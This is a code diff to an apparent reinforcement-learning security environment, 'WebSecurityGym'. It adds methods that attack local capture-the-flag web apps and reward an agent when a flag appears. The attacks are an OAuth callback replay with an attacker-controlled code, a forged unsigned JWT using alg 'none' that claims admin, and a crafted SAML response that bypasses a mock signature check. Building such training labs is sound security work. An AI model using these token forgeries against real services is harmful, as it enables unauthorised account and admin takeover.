@@ -2303,12 +2303,87 @@ class WebSecurityGym(gym.Env):
 
     def _generic_attack_placeholder(self, name):
         """Placeholder for advanced attacks not yet fully implemented."""
-        # Return a neutral response and 0 reward
+        # Check if we have specific implementations for new SSO attacks
+        if name == 'attack_oauth_token_theft':
+            return self._attack_oauth_token_theft()
+        if name == 'attack_jwt_none_alg':
+            return self._attack_jwt_none_alg()
+        if name == 'attack_saml_xml_bypass':
+            return self._attack_saml_xml_bypass()
+            
+        # Return a neutral response and 0 reward for others
         try:
             # Just touch home page to keep session alive
             r = self.session.get(self.target_url, timeout=1)
             return r, 0.0
         except:
+            return None, 0.0
+
+    def _attack_oauth_token_theft(self):
+        """Exploit OAuth missing state parameter (Social App)."""
+        try:
+            # Exploiting the missing 'state' validation by sending attacker-controlled code
+            # In a real attack this would be forcing a victim to use our code, 
+            # here we verify we can trigger the vulnerability condition.
+            payload = {'code': 'ATTACKER_CONTROLLED_CODE'}
+            # Determine target URL based on current port or default
+            target = f"{self.target_url.rstrip('/')}/oauth/callback"
+            if '5003' not in self.target_url and '5003' in str(self.port_map.get('social', 5003)):
+                target = f"http://localhost:{self.port_map.get('social', 5003)}/oauth/callback"
+            
+            r = self.session.get(target, params=payload, allow_redirects=True)
+            
+            reward = 0.0
+            if 'CTF{' in r.text or 'oauth_broken_state_validation' in r.text:
+                reward = 50.0  # High reward for flag
+                
+            return r, reward
+        except Exception as e:
+            return None, 0.0
+
+    def _attack_jwt_none_alg(self):
+        """Exploit JWT 'alg': 'none' vulnerability (Blog App)."""
+        try:
+            # Create unsigned token with 'none' alg
+            # Payload claims user='admin'
+            import jwt
+            token = jwt.encode({"user": "admin", "role": "admin"}, key="", algorithm="none")
+            
+            target = f"{self.target_url.rstrip('/')}/oidc/callback"
+            if '5005' not in self.target_url and '5005' in str(self.port_map.get('blog', 5005)):
+                target = f"http://localhost:{self.port_map.get('blog', 5005)}/oidc/callback"
+                
+            r = self.session.get(target, params={'token': token}, allow_redirects=True)
+            
+            reward = 0.0
+            if 'CTF{' in r.text or 'jwt_none_algorithm' in r.text:
+                reward = 50.0
+                
+            return r, reward
+        except Exception:
+            return None, 0.0
+
+    def _attack_saml_xml_bypass(self):
+        """Exploit SAML XML Signature Bypass (E-Commerce App)."""
+        try:
+            # Current vulnerable logic checks: 'admin@corp.com' AND 'signature>valid'
+            # We construct a mock response satisfying this simple string check
+            # bypassing the actual cryptographic signature validation.
+            payload = 'admin@corp.com_signature>valid' 
+            # Real-world would be XML manipulation, here we match the mock's weak check
+            
+            target = f"{self.target_url.rstrip('/')}/saml/acs"
+            if '5002' not in self.target_url and '5002' in str(self.port_map.get('ecommerce', 5002)):
+                target = f"http://localhost:{self.port_map.get('ecommerce', 5002)}/saml/acs"
+                
+            r = self.session.get(target, params={'SAMLResponse': payload}, allow_redirects=True)
+            
+            reward = 0.0
+            if 'CTF{' in r.text or 'saml_xml_signature_bypass' in r.text:
+                reward = 50.0
+                
+            return r, reward
+        except Exception:
             return None, 0.0
 
     def _update_state_error(self):
